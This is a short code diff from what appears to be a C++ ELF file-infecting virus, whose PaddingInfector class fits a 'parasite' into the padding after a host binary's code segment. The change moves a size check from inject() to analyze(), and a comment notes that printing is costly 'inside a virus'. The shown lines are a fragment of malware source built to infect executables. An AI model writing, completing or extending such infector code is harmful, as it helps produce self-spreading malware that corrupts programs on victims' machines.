@@ -93,8 +93,15 @@ bool PaddingInfector::analyze(std::span<const std::byte> host_mapping,
       // Return padding_size (maximum size of parasite that host can accommodate
       // in its padding between the end of CODE segment and start of next
       // loadable segment)
-
       padding_size_ = phdr_entry->p_offset - parasite_file_offset;
+      if (padding_size_ < parasite_mapping.size()) {
+        // Printf is huge. It's better to not print inside a virus.
+        vf::printf(STR_LITERAL("Host cannot fit parasite padding: %%d parasite "
+                               "size:%%d\n"),
+                   padding_size_, parasite_mapping.size());
+        return false;
+      }
+
       code_segment_last_byte_offset_ = code_segment_last_byte_offset;
       parasite_file_offset_ = parasite_file_offset;
       parasite_load_address_ = parasite_load_address;
@@ -119,13 +126,6 @@ bool PaddingInfector::analyze(std::span<const std::byte> host_mapping,
 std::optional<InjectionResult> PaddingInfector::inject(
     std::span<std::byte> host_mapping,
     std::span<const std::byte> parasite_mapping) {
-  if (padding_size_ < parasite_mapping.size()) {
-    vf::printf(STR_LITERAL("Host cannot fit parasite padding: %%d parasite "
-                           "size:%%d\n"),
-               padding_size_, parasite_mapping.size());
-    return std::nullopt;
-  }
-
   const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());
 
   {
